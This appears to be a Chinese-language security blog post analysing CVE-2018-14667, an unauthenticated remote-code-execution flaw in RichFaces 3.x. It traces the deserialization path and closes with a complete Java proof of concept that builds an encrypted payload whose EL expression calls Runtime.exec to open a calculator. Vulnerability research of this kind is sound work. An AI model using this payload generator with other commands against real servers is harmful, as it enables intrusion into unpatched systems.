<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>RichFaces CVE-2018-14667</title>
  <link rel="icon" href="/favicon.ico">
  <link rel="stylesheet" href="/public/css/amazeui.min.css">
  <link rel="stylesheet" href="/public/css/app.css">
</head>
<body>

<div class="am-container lp-container">
  <header class="am-topbar lp-topbar">
    <h1 class="am-topbar-brand">
      <a href="/">k1n9's Blog</a>
    </h1>
    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
      <ul class="am-nav am-nav-pills am-topbar-nav">
        <li><a href="/">Archives</a></li>
<!--         <li><a href="#">Categories</a></li> -->
        <li><a href="/friends.html">Friends</a></li>
   <!--      <li><a href="#">About Me</a></li> -->
        <li><a href="/rss.xml">Rss</a></li>
      </ul>
    </div>
  </header>
</div>


<div class="am-container lp-container">
  <div class="lp-post">
    <div class="lp-post-header">
      <h1 class="lp-post-title">RichFaces CVE-2018-14667</h1>
      <div class="lp-post-meta">
        <i class="am-icon-calculator"></i><span class="lp-post-date">2018-11-20</span>
        <i class="am-icon-tags"></i><span class="lp-post-tags">Java, RichFaces</span>
      </div>
    </div>
    <div class="lp-post-content">
    <p>影响：3.x ~ 3.3.4(3.x 中最高的版本，官方在 2016 年已经停止维护该项目)</p>

<p>据漏洞的描述为可以通过 org.ajax4jsf.resource.UserResource$UriData 构造恶意的反序列化数据（里面插入 EL 来执行代码），从而攻击者可以在未认证的情况下实现远程代码执行的效果。</p>

<h3 id="richfaces-中的反序列的点">RichFaces 中的反序列的点</h3>

<p>从官网下载 richfaces-demo-3.3.4.Final.war 作为测试对象，</p>

<p>在 BaseFilter#doFilter 中检测是否为资源服务请求（这是个人理解，对 RichFaces 并不熟悉）处下一个断点开始跟踪调试
<img src="https://i.loli.net/2019/07/28/5d3d4eceb334225199.jpg" alt="" /></p>

<p>往前跟到进入 WebXml#getFacesResourceKey
<img src="https://i.loli.net/2019/07/28/5d3d4ed50322933944.jpg" alt="" /></p>

<p>这个方法传入的参数就是 url，然后通过 url 的开头和三种资源的前缀来对比区分请求的资源类型，这三种资源前缀分别为
<img src="https://i.loli.net/2019/07/28/5d3d4ebe17f5533493.jpg" alt="" /></p>

<p>再加上版本号，接下来是截取了相应的前缀和后缀（.jsf）后将中间的值返回</p>

<p>继续往下跟进入 InternetResourceService#serviceResource 就是用前面获取到的返回值作为 resourceKey 去找相对应的 resource
<img src="https://i.loli.net/2019/07/28/5d3d4ec3f113b13924.jpg" alt="" /></p>

<p>往下跟的时候发现前面传进来的 resourceKey 还会根据 DAT(A|B) 来截取一次作为 key</p>

<p><img src="https://i.loli.net/2019/07/28/5d3d4ec46e4fc53300.jpg" alt="" /></p>

<p>这里就有一开始看这个洞的时候比较疑惑的一点，org.ajax4jsf.resource.UserResource 没有注册，直接会抛出上图中的那个异常了。也没找到这个流程中能注册 resource 的点，还以为是得修改服务端的配置添加这个 resource 了，后来看了别人的文章才发现在 MediaOutputRenderer#doEncodeBegin 中有对 UserResource 的创建，它是在对 jsf 的 mediaOutput 标签解析中执行的。在 demo 中动态生成图片处查看它的 url 
<img src="https://i.loli.net/2019/07/28/5d3d4ec2547d830697.jpg" alt="" /></p>

<p>因此在利用的过程中需要用到 demo 中这个已经注册的 UserResource 的 key，在这里是 org.ajax4jsf.resource.UserResource/n/s/-1487394660，如果这里的 key 是已经注册了的就可以继续往下跑了，到进入 ResourceBuilderImpl#getResourceDataForKey
<img src="https://i.loli.net/2019/07/28/5d3d4ed2122c245873.jpg" alt="" /></p>

<p>这个方法的大体流程为截取 DAT(A|B) 后的数据进行解密，然后做反序列化，代码中其实可以看到只有是 DATA 的时候才会做反序列化，DATB 是直接作为对象数组处理了。这里处理输入流的类重写了 resolveClass 方法，做了白名单的检测，要用到的 org.ajax4jsf.resource.UserResource$UriData 就在白名单中，就不跟过去看了。</p>

<p>这个洞的利用并不是反序列化来触发的，触发点还在后面。</p>

<h3 id="触发-el-执行">触发 EL 执行</h3>

<p>接下来的执行流程还是在 InternetResourceService#serviceResource 中，将反序列化获取到的对象存入 resourceContext 中，往下直到进入
<img src="https://i.loli.net/2019/07/28/5d3d4ebd0fcdb84254.jpg" alt="" /></p>

<p>这其中还是有条件判断是否能执行到这一步，不过默认的情况下没看到有影响。跟下去会发现调用到了 UserResource#send，最终在 invoke 处执行了 EL
<img src="https://i.loli.net/2019/07/28/5d3d4ed3b56cb28700.jpg" alt="" /></p>

<p>上面这个只是 EL 执行的其中一处，看 InternetResourceBase#sendHeaders
<img src="https://i.loli.net/2019/07/28/5d3d4ee35572657589.jpg" alt="" /></p>

<p>红圈的这两处其实就是调用的 UserResource#getLastModified 和 UserResource#getExpired，这三处都是可以执行 EL 的，执行流程中的顺序为 UserResource#getLastModified、UserResource#getExpired 和 UserResource#send。</p>

<h3 id="poc">PoC</h3>

<p>简单修改了一下随风师傅的 PoC，改成了在 UserResource#getLastModified 处触发执行</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="n">javax</span><span class="o">.</span><span class="na">faces</span><span class="o">.</span><span class="na">component</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.ajax4jsf.util.base64.Codec</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">util.Reflections</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.el.ValueExpression</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jboss.el.ValueExpressionImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.faces.FacesException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.zip.Deflater</span><span class="o">;</span>

<span class="cm">/**
 * Created by k1n9 on 2018/11/21 at 11:19.
 */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CVE201814667</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">Codec</span> <span class="n">codec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Codec</span><span class="o">();</span>

    <span class="kd">protected</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">encrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">src</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Deflater</span> <span class="n">compressor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Deflater</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">compressed</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">src</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">100</span><span class="o">];</span>
            <span class="n">compressor</span><span class="o">.</span><span class="na">setInput</span><span class="o">(</span><span class="n">src</span><span class="o">);</span>
            <span class="n">compressor</span><span class="o">.</span><span class="na">finish</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">totalOut</span> <span class="o">=</span> <span class="n">compressor</span><span class="o">.</span><span class="na">deflate</span><span class="o">(</span><span class="n">compressed</span><span class="o">);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">zipsrc</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">totalOut</span><span class="o">];</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">compressed</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">zipsrc</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">totalOut</span><span class="o">);</span>
            <span class="n">compressor</span><span class="o">.</span><span class="na">end</span><span class="o">();</span>
            <span class="k">return</span> <span class="n">codec</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">zipsrc</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var6</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">FacesException</span><span class="o">(</span><span class="s">"Error encode resource data"</span><span class="o">,</span> <span class="n">var6</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">String</span> <span class="n">expr</span> <span class="o">=</span> <span class="s">"#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /applications/calculator.app\")}"</span><span class="o">;</span>

        <span class="nc">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.ajax4jsf.resource.UserResource$UriData"</span><span class="o">);</span>
        <span class="nc">Constructor</span> <span class="n">ct</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">()[</span><span class="mi">0</span><span class="o">];</span>
        <span class="n">ct</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ct</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

        <span class="nc">ValueExpression</span> <span class="n">ve</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ValueExpressionImpl</span><span class="o">(</span><span class="n">expr</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span> <span class="o">,</span><span class="kc">null</span><span class="o">);</span>
        <span class="nc">StateHolderSaver</span> <span class="n">stateHolderSaver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StateHolderSaver</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">ve</span><span class="o">);</span>

        <span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"modified"</span><span class="o">,</span> <span class="n">stateHolderSaver</span><span class="o">);</span>

        <span class="nc">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">);</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>

        <span class="kt">byte</span><span class="o">[]</span> <span class="n">output</span> <span class="o">=</span> <span class="n">encrypt</span><span class="o">(</span><span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">output</span><span class="o">,</span> <span class="s">"ISO-8859-1"</span><span class="o">));</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="参考">参考</h3>

<ul>
  <li><a href="https://xz.aliyun.com/t/3264">CVE-2018-14667（POC）</a></li>
  <li><a href="https://threathunter.org/topic/5be44bbbf2ad8dd42fb88dfd">Red Hat JBoss EAP RichFaces - unserialize + el = RCE - 【CVE-2018-14667】</a></li>
</ul>


    </div>
    
    

  </div>
</div>

<div class="am-container lp-container">
  <footer class="am-footer lp-footer">
    <p>Copyright © 2014-2015 All Rights Reserved</p>
    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
  </afooter>
</div>


<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
  <a href="#top" title="回到顶部">
    <span class="am-gotop-title">GoTop</span>
    <i class="am-gotop-icon am-icon-chevron-up"></i>
  </a>
</div>

<script src="/public/js/jquery.min.js"></script>
<script src="/public/js/amazeui.min.js"></script>
<script>
var _hmt = _hmt || [];
(function() {
var hm = document.createElement("script");
hm.src = "//hm.baidu.com/hm.js?cff98725226896ccfb3b1634435b315c";
var s = document.getElementsByTagName("script")[0];
s.parentNode.insertBefore(hm, s);
})();
</script>
</div>
</body>
</html>
